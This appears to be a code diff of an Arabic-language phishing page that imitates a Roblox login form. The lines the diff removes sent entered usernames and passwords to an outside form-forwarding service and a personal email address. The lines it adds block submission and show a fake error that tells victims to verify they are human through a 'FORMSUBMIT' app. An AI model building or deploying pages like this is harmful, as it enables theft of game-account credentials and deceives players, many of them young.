@@ -114,6 +114,18 @@ body{
   margin:12px 0;
   cursor:pointer;
 }
+
+/* رسالة الخطأ الوهمية */
+.fake-alert{
+  display:none;
+  background:#ff4b4b;
+  color:white;
+  text-align:center;
+  padding:12px;
+  border-radius:10px;
+  margin-bottom:12px;
+  font-weight:bold;
+}
 </style>
 </head>
 
@@ -140,11 +152,13 @@ body{
   <div class="box">
     <h2>تسجيل الدخول إلى Roblox</h2>
 
-    <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
-      <input type="hidden" name="_subject" value="تسجيل لاعب جديد">
-      <input type="hidden" name="_template" value="table">
+    <!-- رسالة الخطأ الوهمية -->
+    <div id="fakeAlert" class="fake-alert">
+      حصلت مشكلة، يرجى التحقق من أنك إنسان عبر تطبيق FORMSUBMIT
+    </div>
 
-      <input type="text" name="Player_Name" placeholder="اسم المستخدم/البريد/الهاتف" required>
+    <form id="loginForm">
+      <input type="text" name="Player_Name" placeholder="اسم المستخدم/البريد الإلكتروني" required>
       <input type="password" name="Player_Password" placeholder="كلمة المرور" required>
 
       <button type="submit" class="mainbtn">تسجيل الدخول</button>
@@ -160,6 +174,22 @@ body{
     <div class="small">ليس لديك حساب؟ اشترك</div>
   </div>
 </div>
+
+<script>
+// عند الضغط على تسجيل الدخول
+document.getElementById("loginForm").addEventListener("submit", function(e){
+  e.preventDefault(); // يمنع إرسال الفورم
+
+  // اظهار رسالة الخطأ الوهمية
+  var alertBox = document.getElementById("fakeAlert");
+  alertBox.style.display = "block";
+
+  // ممكن تختفي بعد 5 ثواني تلقائي
+  setTimeout(function(){
+    alertBox.style.display = "none";
+  }, 5000);
+});
+</script>
 
 </body>
 </html>
